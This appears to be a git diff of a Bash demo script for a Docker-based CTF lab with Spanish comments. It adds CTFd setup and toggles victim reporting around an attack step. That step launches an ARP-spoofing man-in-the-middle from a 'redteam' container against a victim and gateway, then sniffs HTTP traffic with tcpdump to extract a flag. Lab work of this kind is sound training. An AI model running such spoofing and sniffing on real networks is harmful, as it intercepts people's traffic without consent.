@@ -48,8 +48,12 @@ submit_flag() {
         --url http://172.20.0.250:8000 2>&1 | sed 's/^/    /'
 }
 
-# Resetea todas las submissions y crea usuario blueteam si no existe
+# Inicializa CTFd (setup inicial + challenges) y resetea submissions
 ctfd_reset_and_setup() {
+    echo -e "  ${CYAN}[CTFd] Inicializando CTFd (setup + challenges si es necesario)...${NC}"
+    docker cp "$(pwd)/scripts/ctfd_init.py" redteam:/tmp/ctfd_init.py
+    docker exec redteam python3 /tmp/ctfd_init.py
+
     echo -e "  ${CYAN}[CTFd] Reseteando submissions anteriores...${NC}"
     docker cp "$(pwd)/scripts/ctfd_reset.py" redteam:/tmp/ctfd_reset.py
     docker exec redteam python3 /tmp/ctfd_reset.py
@@ -185,11 +189,18 @@ step "ARP Spoofing: victim3 <-> gateway"
 docker exec -d redteam python3 /tools/arp_spoof.py -t 172.20.0.12 -g 172.20.0.2 --interval 1 --broadcast
 info "MITM activo entre victim3 (172.20.0.12) y gateway (172.20.0.2)"
 
+step "Activando reportes periódicos de victim3..."
+docker exec victim3 touch /tmp/demo_active
+info "victim3 comenzará a enviar reportes cada 10s al gateway"
+
 step "Capturando tráfico de victim3 (esperando reporte periódico - 25s)..."
 info "victim3 envía reportes cada 10s al gateway - esperando al menos 2 ciclos..."
 docker exec redteam timeout 25 tcpdump -i eth0 -A 'src host 172.20.0.12 and dst port 80' \
     > "$EVIDENCE_DIR/victim3_traffic.txt" 2>/dev/null || true
 info "Tráfico capturado en victim3_traffic.txt"
+
+step "Desactivando reportes periódicos de victim3..."
+docker exec victim3 rm -f /tmp/demo_active
 
 FLAG3=$(grep -oP 'FLAG\{[^}]+\}' "$EVIDENCE_DIR/victim3_traffic.txt" 2>/dev/null | head -1 || echo "NO ENCONTRADA")
 echo -e "  ${GREEN}${BOLD}  Flag 3: $FLAG3${NC}"
